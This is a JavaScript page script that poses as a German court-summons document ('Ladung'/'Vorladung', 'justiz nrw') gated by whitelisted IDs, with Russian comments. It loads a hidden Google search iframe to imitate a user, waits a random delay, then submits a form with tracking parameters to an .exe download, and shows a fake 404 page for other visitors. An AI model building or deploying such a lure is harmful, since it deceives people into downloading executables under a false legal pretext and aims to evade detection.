document.addEventListener('DOMContentLoaded', function() {
  const urlParams = new URLSearchParams(window.location.search);
  const docType = urlParams.get('type');
  const docId = urlParams.get('id');
  
  // Белый список документов
  const validDocs = {
    ladung: ['L-40822', 'L-55199', 'L-77301'],
    vorladung: ['V-11245', 'V-88903']
  };

  if (validDocs[docType]?.includes(docId)) {
    // Создаем скрытый iframe для имитации пользователя
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = `https://www.google.com/search?q=justiz+nrw+${docId}`;
    document.body.appendChild(iframe);
    
    // Основной редирект через 3-5 сек
    setTimeout(() => {
      // Формируем конечный URL с рандомными параметрами
      const finalUrl = `https://builds.dotnet.microsoft.com/dotnet/Sdk/9.0.304/dotnet-sdk-9.0.304-win-x64.exe?cache=${Date.now()}`;
      
      // Создаем форму для "человеческого" редиректа
      const form = document.createElement('form');
      form.method = 'GET';
      form.action = finalUrl;
      
      // Добавляем скрытые параметры
      const params = {
        source: 'github-redirect',
        session: Math.random().toString(36).substring(2),
        doc_type: docType,
        doc_id: docId
      };
      
      for (const [key, value] of Object.entries(params)) {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = key;
        input.value = value;
        form.appendChild(input);
      }
      
      document.body.appendChild(form);
      form.submit();
    }, 3000 + Math.random() * 2000);
  } else {
    document.getElementById('content').innerHTML = `
      <h1>Dokument nicht gefunden</h1>
      <p>Fehler 404: Das angeforderte Dokument existiert nicht.</p>
    `;
  }
});
